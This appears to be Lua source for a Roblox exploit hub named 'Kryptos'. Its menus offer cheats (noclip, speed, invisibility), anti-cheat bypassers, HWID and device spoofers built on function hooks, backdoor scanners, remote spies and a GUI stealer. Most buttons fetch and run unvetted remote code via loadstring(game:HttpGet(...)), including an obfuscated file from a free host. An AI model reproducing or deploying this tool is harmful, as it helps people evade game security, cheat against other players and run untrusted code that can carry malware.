	Name = "Noclip",
	Default = false,
	Callback = function(a)
		getgenv().looping = a
		task.spawn(function()
			while true do 
				if not getgenv().looping then
					for i, v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
						if v:IsA("BasePart") and v.CanCollide == false then
							v.CanCollide = true
						end
					end
					break
				end
				task.wait()
				if getgenv().looping and game:GetService("Players").LocalPlayer.Character ~= nil then
					for i, v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
						if v:IsA("BasePart") and v.CanCollide == true then
							v.CanCollide = false
						end
					end
				end
			end
		end)
	end
})

PlayerTab:AddToggle({
	Name = "Invisible",
	Default = false,
	Callback = function(Value)
    if Value == true then
      _G.InvisibleToggle = true
      loadstring(game:HttpGet("https://pastebin.com/raw/f7n6qjKu"))()
      else
        _G.InvisibleToggle = false
      end
	end    
})

PlayerTab:AddButton({
	Name = "Invisible PC",
	Callback = function()
		print("The keybind is E")
		loadstring(game:HttpGet("https://pastebin.com/raw/hk09qgd9"))()
		StarterGui:SetCore("DevConsoleVisible", true)
	end    
})

PlayerTab:AddButton({
	Name = "Refresh Invisible",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/f7n6qjKu"))()
	end    
})

local WalkSpeed = PlayerTab:AddSlider({
	Name = "Walkspeed",
	Min = 16,
	Max = 1000,
	Default = 50,
	Color = Color3.fromRGB(248,193,104),
	Increment = 1,
	ValueName = "Walkspeed",
	Callback = function(Value)
		game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = Value
	end    
})

local JumpPower = PlayerTab:AddSlider({
	Name = "Jump Power",
	Min = 50,
	Max = 1000,
	Default = 50,
	Color = Color3.fromRGB(248,193,104),
	Increment = 1,
	ValueName = "Jump power",
	Callback = function(Value)
		game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = Value
	end 
})

local Time = PlayerTab:AddSlider({
	Name = "Time",
	Min = 0,
	Max = 24,
	Default = 14,
	Color = Color3.fromRGB(248,193,104),
	Increment = 1,
	ValueName = "Time",
	Callback = function(p)
		game:GetService("Lighting").ClockTime = p
	end    
})

local FOV = PlayerTab:AddSlider({
	Name = "FOV",
	Min = 70,
	Max = 1000,
	Default = 70,
	Color = Color3.fromRGB(248,193,104),
	Increment = 1,
	ValueName = "FOV",
	Callback = function(Value)
		game:GetService("Workspace").CurrentCamera.FieldOfView = Value
	end 
})

local ZOOM = PlayerTab:AddSlider({
	Name = "ZOOM",
	Min = 400,
	Max = 100000,
	Default = 400,
	Color = Color3.fromRGB(248,193,104),
	Increment = 10,
	ValueName = "FOV",
	Callback = function(Value)
    local player = game.Players.LocalPlayer
    player.CameraMaxZoomDistance = Value
	end 
})

local Gravity = PlayerTab:AddSlider({
	Name = "Gravity",
	Min = 1,
	Max = 1000,
	Default = 192.2,
	Color = Color3.fromRGB(248,193,104),
	Increment = 1,
	ValueName = "FOV",
	Callback = function(Value)
		game.workspace.Gravity = Value
	end 
})

local HipHeight = PlayerTab:AddSlider({
	Name = "Hip Height",
	Min = 0,
	Max = 1000,
	Default = 0,
	Color = Color3.fromRGB(248,193,104),
	Increment = 1,
	ValueName = "HipHeight",
	Callback = function(Value) 
	  local Humanoid = game.Players.LocalPlayer.Character.Humanoid
    Humanoid.HipHeight = Value
	end 
})


PlayerTab:AddTextbox({
	Name = "Walkspeed",
	Default = "16",
	TextDisappear = false,
	Callback = function(Value)
		game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = Value
	end	  
})

PlayerTab:AddTextbox({
	Name = "Jump power",
	Default = "50",
	TextDisappear = false,
	Callback = function(Value)
		game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = Value
	end	  
})

PlayerTab:AddTextbox({
	Name = "Time",
	Default = "14",
	TextDisappear = false,
	Callback = function(Value)
	  game:GetService("Lighting").ClockTime = Value
	end	  
})

PlayerTab:AddTextbox({
	Name = "FOV",
	Default = "70",
	TextDisappear = false,
	Callback = function(Value)
		game:GetService("Workspace").CurrentCamera.FieldOfView = Value
	end	  
})

PlayerTab:AddTextbox({
	Name = "ZOOM",
	Default = "400",
	TextDisappear = false,
	Callback = function(Value)
    local player = game.Players.LocalPlayer
    player.CameraMaxZoomDistance = Value
	end	  
})

PlayerTab:AddTextbox({
	Name = "Gravity",
	Default = "192.2",
	TextDisappear = false,
	Callback = function(Value)
		game.workspace.Gravity = Value
	end	  
})

PlayerTab:AddTextbox({
	Name = "Hip Height",
	Default = "0",
	TextDisappear = false,
	Callback = function(Value)
		local Humanoid = game.Players.LocalPlayer.Character.Humanoid
    Humanoid.HipHeight = Value
	end	  
})

--[] Seperator
local Section = PlayerTab:AddSection({
	Name = "Reset"
})
--[] Seperator


PlayerTab:AddButton({
	Name = "Reset Inventory",
	Callback = function()
		local gear = game.Players.LocalPlayer.Backpack:GetChildren()
    for i, child in ipairs(gear) do
      child:Destroy()
    end
	end    
})

PlayerTab:AddButton({
	Name = "Reset Character",
	Callback = function()
		forceResetAction()
	end    
})

PlayerTab:AddButton({
	Name = "Reset Walkspeed",
	Callback = function()
		WalkSpeed:Set(16)
		game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 16
	end    
})

PlayerTab:AddButton({
	Name = "Reset Jump Power",
	Callback = function()
		JumpPower:Set(50)
		game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = 50
	end    
})

PlayerTab:AddButton({
	Name = "Reset Time",
	Callback = function()
		Time:Set(14)
		game:GetService("Lighting").ClockTime = 14
	end    
})

PlayerTab:AddButton({
	Name = "Reset FOV",
	Callback = function()
		FOV:Set(70)
		game:GetService("Workspace").CurrentCamera.FieldOfView = 70
	end    
})

PlayerTab:AddButton({
	Name = "Reset Gravity",
	Callback = function()
		Gravity:Set(192.2)
		game.workspace.Gravity = 192.2
	end    
})

PlayerTab:AddButton({
	Name = "Reset Hip Height",
	Callback = function()
		HipHeight:Set(0)
		game.workspace.Gravity = 0
	end    
})

PlayerTab:AddButton({
	Name = "Reset Character Settings",
	Callback = function()
		JumpPower:Set(50)
		game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = 50
		WalkSpeed:Set(16)
		game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 16
		game:GetService("Lighting").ClockTime = 14
		Time:Set(14)
		FOV:Set(70)
		game:GetService("Workspace").CurrentCamera.FieldOfView = 70
		Gravity:Set(192.2)
		game.workspace.Gravity = 192.2
		HipHeight:Set(0)
		local Humanoid = game.Players.LocalPlayer.Character.Humanoid
    Humanoid.HipHeight = 0
    ZOOM:Set(400)
    local player = game.Players.LocalPlayer
    player.CameraMaxZoomDistance = 400
	end    
})

--[] Seperator
local Section = PlayerTab:AddSection({
	Name = "Misc"
})
--[] Seperator

PlayerTab:AddButton({
	Name = "Display Name Remover",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/XdAKeTym'))()
	end
})	

PlayerTab:AddButton({
	Name = "Push to talk [T]",
	Callback = function()
		loadstrin(game:HttpGet("https://pastebin.com/raw/XcZPe0Lj"))()
	end
})	


--[] Kryptos | Debugging

DebuggingTab:AddParagraph("WARNING","These scripts are made for developers that make exploits. Executing these might get you kicked out or even banned of the game!")

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Executor UI's"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "Executer UI Incogito",
	Callback = function()
		loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-Incognito-UI-Remake-13393'))()
	end
})

DebuggingTab:AddButton({
	Name = "Executer UI Synapse",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/Synapse_UI.txt'))()
	end
})

DebuggingTab:AddButton({
	Name = "Executer UI Solara",
	Callback = function()
		loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-Solara-internal-UI-V2-FANMADE-15137'))()
	end
})

DebuggingTab:AddButton({
	Name = "Executer UI 1",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/Hu0XkvMg"))()
	end
})

DebuggingTab:AddButton({
	Name = "Executer UI 2",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/PzCjpXMC"))()
	end
})

DebuggingTab:AddButton({
	Name = "Executer UI 3",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/9nvwUAGr"))()
	end
})

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Executor"
})
--[] Seperator

DebuggingTab:AddTextbox({
	Name = "Executor",
	Default = "Paste your scripts here",
	TextDisappear = false,
	Callback = function(Value)
		ExecutorValue = Value
	end	  
})
DebuggingTab:AddButton({
	Name = "Execute",
	Callback = function()
		loadstring(ExecutorValue)()
	end
})

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Executor Testing"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "Create Console Button",
	Callback = function()
	  CreateIcon("rbxassetid://7733924046").MouseButton1Click:Connect(function()
	    game:GetService('StarterGui'):SetCore("DevConsoleVisible", true)
	 end)
	end
})

DebuggingTab:AddButton({
	Name = "Open Console",
	Callback = function()
		game:GetService'StarterGui':SetCore("DevConsoleVisible", true)
	end
})

DebuggingTab:AddButton({
	Name = "Executor LVL",
	Callback = function()
		printidentity()
	end
})

DebuggingTab:AddButton({
	Name = "Executor LVL Validator",
	Callback = function()
		loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-printidentity-Validator-15130'))()
	end
})

DebuggingTab:AddButton({
	Name = "Vulnerability Scanner",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialValkyrie/Vulnerability-Check/main/Executor%20Vulnerability%20Check"))()
	end
})

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "UNC"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "MoreUnc",
	Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-MoreUNC-13110"))()
	end
})


DebuggingTab:AddButton({
	Name = "UNC Test 1",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/unified-naming-convention/NamingStandard/main/UNCCheckEnv.lua"))()
	end
})

DebuggingTab:AddButton({
	Name = "UNC Test 2",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/tests/main/UNC%20no%20luau.lua"))()
	end
})

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Anti-Cheat Bypass"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "AC Bypasser+ [ANTICHEAT]",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Xen8054/AntiCheatBypassPLUS/main/Script"))();
	end
})

DebuggingTab:AddButton({
	Name = "Adonis Bypasser [ANTICHEAT]",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/GZRt3WgA"))()
	end
})

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Essentials"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "RoTotal",
	Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-RoTotal-9561"))()
	end
})	

DebuggingTab:AddButton({
	Name = "Auto Clicker",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JustEzpi/ROBLOX-Scripts/main/ROBLOX_AutoClicker"))()
	end
})	

DebuggingTab:AddButton({
	Name = "Coords Finder V2",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/FSy9bHnW"))()
	end
})	

DebuggingTab:AddButton({
	Name = "Http Spy",
	Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-httpspy-8197"))()
	end
})	

DebuggingTab:AddButton({
	Name = "Anti Webhook",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/C4ntmknq"))()
	end
})	

DebuggingTab:AddButton({
	Name = "GUI Stealer",
	Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-GuiStealer-12751"))()
	end
})	

DebuggingTab:AddButton({
	Name = "Keyboard",
	Callback = function()
		loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-MobileKeyboard-8101"))()
	end
})	

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Spoofer"
})
--[] Seperator

function UsernameSpoof()
    local Plr = game.Players.LocalPlayer
    for Index, Value in next, game:GetDescendants() do
        if Value.ClassName == "TextLabel" then
            local has = string.find(Value.Text, Plr.Name)
            if has then
                local str = Value.Text:gsub(Plr.Name, name)
                Value.Text = str
            end
            Value:GetPropertyChangedSignal("Text"):Connect(
                function()
                    local str = Value.Text:gsub(Plr.Name, name)
                    Value.Text = str
                end
            )
        end
    end
    game.DescendantAdded:Connect(
        function(Value)
            if Value.ClassName == "TextLabel" then
                local has = string.find(Value.Text, Plr.Name)
                Value:GetPropertyChangedSignal("Text"):Connect(
                    function()
                        local str = Value.Text:gsub(Plr.Name, name)
                        Value.Text = str
                    end
                )
                if has then
                    local str = Value.Text:gsub(Plr.Name, name)
                    Value.Text = str
                end
            end
        end
    )
end

DebuggingTab:AddTextbox({
	Name = "HWID Spoofer",
	Default = 7,
	TextDisappear = false,
	Callback = function(Value)
    local FakeHWID = Value
    hookfunction(game:GetService("RbxAnalyticsService"):GetClientId(), function()
      return FakeHWID
    end)
	end	  
})


DebuggingTab:AddTextbox({
	Name = "Printidentity Spoofer",
	Default = 7,
	TextDisappear = false,
	Callback = function(Value)
		local originalPrintIdentity = printidentity
    local FakeLVL = Value
    hookfunction(originalPrintIdentity, function()
      print("Current identity is " .. FakeLVL)
    end)
	end	  
})

DebuggingTab:AddTextbox({
	Name = "Username Spoofer",
	Default = PLAYERNAME,
	TextDisappear = false,
	Callback = function(Value)
		getgenv().name = Value
		UsernameSpoof()
	end	  
})

DebuggingTab:AddTextbox(
    {
        Name = "Ping Spoofer",
        Default = "",
        TextDisappear = false,
        Callback = function(Value)
            local PerformanceStats =
                game:GetService("CoreGui"):WaitForChild("RobloxGui"):WaitForChild("PerformanceStats")
            local PingLabel
            for I, Child in next, PerformanceStats:GetChildren() do
                if Child.StatsMiniTextPanelClass.TitleLabel.Text == "Ping" then
                    PingLabel = Child.StatsMiniTextPanelClass.ValueLabel
                    break
                end
            end

            local text = "spoof"
            PingLabel:GetPropertyChangedSignal("Text"):Connect(
                function()
                    PingLabel.Text = Value
                end
            )
            PingLabel.Text = Value
        end
    }
)


DebuggingTab:AddButton {
    Name = "ID Spoofer [To Creator ID]",
    Callback = function()
        game.Players.LocalPlayer.Character.Head:Destroy()
        if game.CreatorType == Enum.CreatorType.User then
            game.Players.LocalPlayer.UserId = game.CreatorId
        end

        if game.CreatorType == Enum.CreatorType.Group then
            game.Players.LocalPlayer.UserId = game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId).Owner.Id
        end
    end
}

DebuggingTab:AddButton {
    Name = "Device Spoofer [To Mobile]",
    Callback = function()
        local UserInputService = game:GetService("UserInputService")
        local GuiService = game:GetService("GuiService")

        local namecall, index

        namecall =
            hookmetamethod(
            game,
            "__namecall",
            function(...)
                local args = {...}
                local self = args[1]
                local method = getnamecallmethod()

                if self == UserInputService or self == GuiService then
                    if method == "GetPlatform" then
                        return Enum.Platform.Android
                    elseif method == "IsTenFootInterface" then
                        return false
                    end
                end
                return namecall(...)
            end
        )

        index =
            hookmetamethod(
            game,
            "__index",
            function(tbl, idx)
                if tostring(getcallingscript()) ~= "ControlModule" and tbl == UserInputService then
                    if idx == "TouchEnabled" then
                        return true
                    elseif idx == "MouseEnabled" then
                        return false
                    elseif idx == "KeyboardEnabled" then
                        return false
                    end
                end
                return index(tbl, idx)
            end
        )
    end
}

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Admin"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "Infinite Yield",
	Callback = function()
		loadstring(game:HttpGet("https://cdn.wearedevs.net/script/Infinite%20Yield.txt"))()
	end    
})

DebuggingTab:AddButton({
	Name = "Infinite Yield Secure",
	Callback = function()
		loadstring(game:HttpGet("https://github.com/ionlyusegithubformcmods/1-Line-Scripts/raw/main/Infinite%20Yield%20but%20with%20secure%20dex"))()
	end    
})


DebuggingTab:AddButton({
	Name = "Fate's Admin",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
	end    
})

DebuggingTab:AddButton({
	Name = "CMD-X",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
	end    
})

DebuggingTab:AddButton({
	Name = "Nameless",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
	end    
})

DebuggingTab:AddButton({
	Name = "Proton",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/HuT90Wbu"))()
	end    
})

DebuggingTab:AddButton({
	Name = "Reviz",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/ibFPdiF7'))()
	end    
})

DebuggingTab:AddButton({
	Name = "Shattervast",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/iL4NRDux'))()
	end    
})

DebuggingTab:AddButton({
	Name = "Homebrew",
	Callback = function()
		_G.CustomUI = false
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'), true))()
	end    
})

DebuggingTab:AddButton({
	Name = "Homebrew Custom UI",
	Callback = function()
		_G.CustomUI = true
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'), true))()
	end    
})

DebuggingTab:AddButton({
	Name = "QuirkyCMD",
	Callback = function()
    loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
	end    
})

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Experimental"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "Lag Reducer",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/RW7ZT29m'))()
	end
})

DebuggingTab:AddButton({
	Name = "FPS Counter",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Sempiller/sdluniversal/main/fpsviewer.lua"))()
	end
})

DebuggingTab:AddButton({
	Name = "FPS+",
	Callback = function()
		loadstring(game:HttpGet("https://fpsplus.000webhostapp.com/OBFUSCATED_SOURCE_FPSPLUS.lua", true))()
	end
})	

DebuggingTab:AddTextbox({
	Name = "FPS Cap Changer",
	Default = "60",
	TextDisappear = false,
	Callback = function(Value)
		setfpscap(Value)
	end	  
})

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Dex's"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "Dark Dex V1",
	Callback = function()
		loadstring(game:GetObjects("rbxassetid://3025032531")[1].Source)()
	end
})	

DebuggingTab:AddButton({
	Name = "Dark Dex V2",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceSpiffer/Scripts/main/Script4", true))()
	end
})	

DebuggingTab:AddButton({
	Name = "Dark Dex V3",
	Callback = function()
		loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()
	end
})	

DebuggingTab:AddButton({
	Name = "Dark Dex V4",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceSpiffer/Scripts/main/Script5", true))()
	end
})

DebuggingTab:AddButton({
	Name = "Dark Dex V4 [MOBILE]",
	Callback = function()
		loadstring(game:HttpGet("https://github.com/Hosvile/DEX-Explorer/releases/latest/download/main.lua", true))()
	end
})	

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Remote SPY"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "SimpleSPY V3",
	Callback = function()
		loadstring(game:HttpGet('loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()'))()
	end
})

DebuggingTab:AddButton({
	Name = "SimpleSPY V2.2",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua'))()
	end
})

DebuggingTab:AddButton({
	Name = "TurtleSPY",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Brand/Turtle-Spy/main/source.lua", true))()
	end
})	

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Game Vulnerability"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "Deconstructed Hex",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/S28p8fN9"))()
  end
})

DebuggingTab:AddButton({
	Name = "Harked GUI",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Legenda06/Harked/main/GUI"))()
  end
})

DebuggingTab:AddParagraph("Game Teleporter","Teleport to the game with a vulnerability!")

local GameList = {
    ["BT-Drive-BETA"] = 10592754185,
    ["Car-Crash-Test"] = 4643061038,
    ["Car Crash Test"] = 7720943627,
    ["Car-Crashing-Simulator"] = 7217128574,
    ["Car-Suspension-Test"] = 6816975827,
    ["CrashBG-drive"] = 7283842182,
    ["Crush-Hard"] = 10927225814,
    ["Luigis-Cafe-Restaurant"] = 4829955709,
    ["Ramp-Jumping-On-sports-cars"] = 9043532917,
    ["Ro-Crash"] = 4456880028,
    ["TRAFFIC-Road-of-Car-Crash"] = 3239849876,
    ["UPDATE-Realistic-Car-Crash-Simulator"] = 7764872557,
    ["Z-Bus"] = 5752297721,
    ["Social-Hangout-VOICE-CHAT"] = 5551771360
}

local GameNames = {}
for name, _ in pairs(GameList) do
	table.insert(GameNames, name)
end

local SelectedGame = nil

DebuggingTab:AddDropdown({
	Name = "Select Game",
	Default = "Select a game",
	Options = GameNames,
	Callback = function(Value)
		SelectedGame = GameList[Value]
	end
})

DebuggingTab:AddButton({
	Name = "Teleport",
	Callback = function()
		if SelectedGame then
			game:GetService("TeleportService"):Teleport(SelectedGame, game:GetService("Players").LocalPlayer)
		else
			print("No game selected")
		end
	end
})

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Game Scanning"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "Backdoor Scanner & [EXECUTOR] 1",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/source.lua', true))()
	end
})	

DebuggingTab:AddButton({
	Name = "Backdoor Scanner & [EXECUTOR] 2",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
	end
})

DebuggingTab:AddButton({
	Name = "Backdoor Scanner & [EXECUTOR] 3",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
	end
})

--[] Kryptos | Settings

--[] Seperator

SettingsTab:AddParagraph("WARNING","Changing these might require you to rejoin your game if you dont know what youre doing!")

SettingsTab:AddButton({
	Name = "End Kryptos",
	Callback = function()
		OrionLib:Destroy()
	end    
})

SettingsTab:AddButton({
	Name = "Reload Kryptos",
	Callback = function()
		print("Kryptos Reloaded Succesfully")
		loadstring(game:HttpGet(""))
		OrionLib:Destroy()
	end    
})

--[] Seperator
local Section = SettingsTab:AddSection({
	Name = "ESP"
})
--[] Seperator
SettingsTab:AddButton({
	Name = "ESP Refresh",
	Callback = function()
	  _G.ESPVisible = true
    Esp()
    _G.ESPVisible = false
    Esp()
  end
})

SettingsTab:AddToggle({
	Name = "ESP Visible",
	Default = false,
	Callback = function(Value)
		if Value == true then
		  _G.ESPVisible = true
		  Esp()
		  else
		    _G.ESPVisible = false
		    Esp()
		end
	end    
})

SettingsTab:AddToggle({
	Name = "Team Check",
	Default = false,
	Callback = function(Value)
		if Value == true then
		  _G.TeamCheck = true
		  Esp()
		  else
		    _G.TeamCheck = false
		    Esp()
		end
	end    
})

SettingsTab:AddToggle({
	Name = "Center",
	Default = true,
	Callback = function(Value)
		if Value == true then
		  _G.Center = true
		  Esp()
		  else
		    _G.Center = false
		    Esp()
		end
	end    
})

SettingsTab:AddToggle({
	Name = "Outline",
	Default = true,
	Callback = function(Value)
		if Value == true then
		  _G.Outline = true
		  Esp()
		  else
		    _G.Outline = false
		    Esp()
		end
	end    
})


SettingsTab:AddTextbox({
	Name = "Text Size",
	Default = "25",
	TextDisappear = false,
	Callback = function(Value)
	  _G.TextSize = Value
	end	  
})

SettingsTab:AddTextbox({
	Name = "Text Transparency",
	Default = "1.7",
	TextDisappear = false,
	Callback = function(Value)
		_G.TextTransparency = Value
	end	  
})

--[] Kryptos | Info

InfoTab:AddParagraph("Kryptos VER", KryptosVersion)

--[] Seperator
local Section = InfoTab:AddSection({
	Name = "Information"
})
--[] Seperator

InfoTab:AddParagraph("Kryptos", "Kryptos, a non opensource hub")

InfoTab:AddParagraph("Script", "Scripts within Kryptos is all internet found.")

InfoTab:AddParagraph("Bypasser", "Bypasser is using Bypassi API currently the best free API")

--[] Seperator
local Section = InfoTab:AddSection({
	Name = "Developers"
})
--[] Seperator

InfoTab:AddParagraph("Kryptos / REN", "Founder")

InfoTab:AddParagraph("Jazmine", "Founder of Skyhub, Helped with 5% of everything [:")

InfoTab:AddParagraph("Skire", "Founder of Spotify player, Helped with 5% of everything (:")

--[] Seperator
local Section = InfoTab:AddSection({
	Name = "Showcasers"
})
--[] Seperator

InfoTab:AddParagraph("Syyla", "www.youtube.com/@Candxsploits")

InfoTab:AddParagraph("Mare", "www.youtube.com/@phillymademare")

InfoTab:AddParagraph("Yasuf", "www.youtube.com/@yasufshowcase")

--[] Seperator
local Section = InfoTab:AddSection({
	Name = "Development Testers"
})
--[] Seperator

InfoTab:AddParagraph("Eryxie", "First tester of Kryptos")

InfoTab:AddParagraph("Jazmine", "Second tester of Kryptos")

InfoTab:AddParagraph("Testaccount", "Third tester of Kryptos")

InfoTab:AddParagraph("Missing Name?", "Be a tester right now!")

--[] Seperator
local Section = InfoTab:AddSection({
	Name = "Social"
})
--[] Seperator

InfoTab:AddButton({
	Name = "Github",
	Callback = function()
		setclipboard("Not yet Implemented")
	end
})

InfoTab:AddButton({
	Name = "Discord",
	Callback = function()
		setclipboard("Not yet Implemented")
	end
})

InfoTab:AddButton({
	Name = "Youtube",
	Callback = function()
		setclipboard("Not yet Implemented")
	end
})

--[] Seperator
local Section = InfoTab:AddSection({
	Name = "Information"
})

InfoTab:AddParagraph("GameVuln Found", VulnGame)

InfoTab:AddParagraph("Hardware ID", HWID)

InfoTab:AddParagraph("Roblox Username", PLAYERNAME)

InfoTab:AddParagraph("Roblox ID", ID)

InfoTab:AddParagraph("MembershipType", MembershipType)

InfoTab:AddParagraph("Account Age", AccountAge)

InfoTab:AddParagraph("Game ID", GameID)

--[] Seperator
local Section = InfoTab:AddSection({
	Name = "Copy"
})
--[] Seperator

InfoTab:AddButton({
	Name = "Copy your HWID",
	Callback = function()
		setclipboard(HWID)
	end
})

InfoTab:AddButton({
	Name = "Copy your Username",
	Callback = function()
		setclipboard(PLAYERNAME)
	end
})

InfoTab:AddButton({
	Name = "Copy your ID",
	Callback = function()
		setclipboard(ID)
	end
})

InfoTab:AddButton({
	Name = "Copy your MembershipType",
	Callback = function()
		setclipboard(MembershipType)
	end
})

InfoTab:AddButton({
	Name = "Copy your Account Age",
	Callback = function()
		setclipboard(AccountAge)
	end
})

InfoTab:AddButton({
	Name = "Copy Game ID",
	Callback = function()
		setclipboard(GameID)
	end
})

--[] Seperator
local Section = InfoTab:AddSection({
	Name = "Copy Other Players"
})
--[] Seperator

local Players = game:GetService("Players")
local SelectedPlayer = "Kryptos"
local SelectedPlayerUserName = ""
local SelectedPlayerDisplayName = ""
local SelectedPlayerUserId = ""
local SelectedPlayerAccountAge = 0

local function getPlayerInfo(playerName)
    local player = Players:FindFirstChild(playerName)
    if player then
        SelectedPlayerUserName = playerName
        SelectedPlayerDisplayName = player.DisplayName
        SelectedPlayerUserId = player.UserId
        SelectedPlayerAccountAge = player.AccountAge
    else
        print("Player not found")
        SelectedPlayerUserName = ""
        SelectedPlayerDisplayName = ""
        SelectedPlayerUserId = ""
        SelectedPlayerAccountAge = 0
    end
end

local SelectedPlayerLabel = InfoTab:AddLabel("Non selected")

local function UpdatePlayerDropdown()
    playerNames = {}
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    PlayerDropdown:Refresh(playerNames,true)
end

local function ScrollDropdown(direction)
    local currentIndex = table.find(playerNames, SelectedPlayer)
    if currentIndex then
        local newIndex = currentIndex + direction
        if newIndex >= 1 and newIndex <= #playerNames then
            SelectedPlayer = playerNames[newIndex]
            PlayerDropdown:Set(SelectedPlayer)
            SelectedPlayerLabel:Set(SelectedPlayer)
            GetSelectedPlayerInfo()  -- Update player info
        end
    end
end

function GetSelectedPlayerInfo()
    getPlayerInfo(SelectedPlayer)
    UpdatePlayerDropdown()
end

local PlayerDropdown = InfoTab:AddDropdown({
    Name = "Player Names",
    Default = playerNames[1] or SelectedPlayer,
    Options = playerNames,
    Callback = function(Selected)
        SelectedPlayerLabel:Set(Selected)
        SelectedPlayer = Selected
        GetSelectedPlayerInfo()
    end
})

InfoTab:AddButton({
    Name = "Scroll Up",
    Callback = function()
        ScrollDropdown(-1)  -- Scroll up
    end
})

InfoTab:AddButton({
    Name = "Scroll Down",
    Callback = function()
        ScrollDropdown(1)  -- Scroll down
    end
})

InfoTab:AddButton({
    Name = "Copy Username",
    Callback = function()
        setclipboard(SelectedPlayerUserName)
    end
})

InfoTab:AddButton({
    Name = "Copy Display Name",
    Callback = function()
        setclipboard(SelectedPlayerDisplayName)
    end
})

InfoTab:AddButton({
    Name = "Copy Userid",
    Callback = function()
        setclipboard(tostring(SelectedPlayerUserId))
    end
})

